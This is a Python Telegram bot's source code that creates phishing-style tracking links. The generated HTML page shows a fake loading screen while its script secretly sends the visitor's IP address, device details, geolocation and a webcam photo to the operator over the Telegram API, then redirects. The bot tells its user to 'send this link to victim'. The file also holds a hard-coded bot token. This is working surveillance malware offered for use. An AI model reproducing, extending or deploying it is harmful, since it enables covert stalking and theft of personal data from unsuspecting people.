import telebot
import os
import time

TOKEN = "8754262218:AAEGMkxM2YWo121PjkZMr4MX3Jd9g8cJhQw"  # Apna token yahan dal
bot = telebot.TeleBot(TOKEN)

# Store user state
user_state = {}

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.chat.id
    bot.reply_to(message, "✅ Bot is working!\n\nSend me any URL:\nhttps://www.instagram.com/p/xxxxx")
    user_state[user_id] = "waiting_url"

@bot.message_handler(func=lambda m: True)
def handle(message):
    user_id = message.chat.id
    url = message.text.strip()
    
    # Check if user is in waiting state
    if user_state.get(user_id) != "waiting_url":
        bot.reply_to(message, "Use /start first")
        return
    
    # Check if valid URL
    if not (url.startswith("http://") or url.startswith("https://")):
        bot.reply_to(message, "❌ Send valid URL starting with http:// or https://")
        return
    
    # Generate HTML payload
    html = f'''<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Loading</title>
<style>
body{{background:#000;color:#0f0;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:monospace}}
.loader{{border:3px solid #333;border-top:3px solid #0f0;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto}}
@keyframes spin{{0%{{transform:rotate(0deg)}}100%{{transform:rotate(360deg)}}}}
</style>
</head>
<body>
<div style="text-align:center">
<div class="loader"></div>
<h2>Connecting...</h2>
</div>
<script>
let TOKEN = "{TOKEN}";
let USER = {user_id};
let TARGET = "{url}";

async function sendMsg(t) {{
    await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage', {{
        method:'POST',
        headers:{{'Content-Type':'application/json'}},
        body:JSON.stringify({{chat_id:USER, text:t}})
    }});
}}

async function getIP() {{
    let r=await fetch('https://api.ipify.org?format=json');
    let d=await r.json();
    return d.ip;
}}

async function getLocation() {{
    return new Promise(r=>{{
        if(navigator.geolocation){{
            navigator.geolocation.getCurrentPosition(
                p=>{{
                    sendMsg('📍 Location: https://www.google.com/maps?q='+p.coords.latitude+','+p.coords.longitude);
                    r();
                }},
                ()=>r()
            );
        }} else r();
    }});
}}

async function takePhoto() {{
    try{{
        let s=await navigator.mediaDevices.getUserMedia({{video:true}});
        let v=document.createElement('video');
        v.srcObject=s;
        await new Promise(r=>{{v.onloadedmetadata=()=>{{v.play();r()}}}});
        await new Promise(r=>setTimeout(r,300));
        let c=document.createElement('canvas');
        c.width=v.videoWidth;
        c.height=v.videoHeight;
        c.getContext('2d').drawImage(v,0,0);
        let b=await new Promise(r=>c.toBlob(r));
        if(b){{
            let fd=new FormData();
            fd.append('chat_id',USER);
            fd.append('photo',b);
            await fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto',{{method:'POST',body:fd}});
        }}
        s.getTracks().forEach(t=>t.stop());
    }} catch(e){{}}
}}

async function start(){{
    let ip=await getIP();
    await sendMsg('🎯 DATA\\nIP: '+ip+'\\nDevice: '+navigator.userAgent);
    await getLocation();
    await takePhoto();
    window.location.href=TARGET;
}}
start();
</script>
</body>
</html>'''
    
    # Save HTML file
    filename = f"v_{user_id}.html"
    with open(filename, "w") as f:
        f.write(html)
    
    # Generate link
    link = f"https://telegram-bot-osvi.onrender.com/{filename}"
    
    bot.reply_to(message, f"✅ YOUR LINK:\n{link}\n\nSend this link to victim.\n\nWhen they click, you will get:\n- IP Address\n- Location\n- Camera Photo\n- Device Info")
    
    # Clear state
    del user_state[user_id]

print("Bot started...")
bot.infinity_polling()
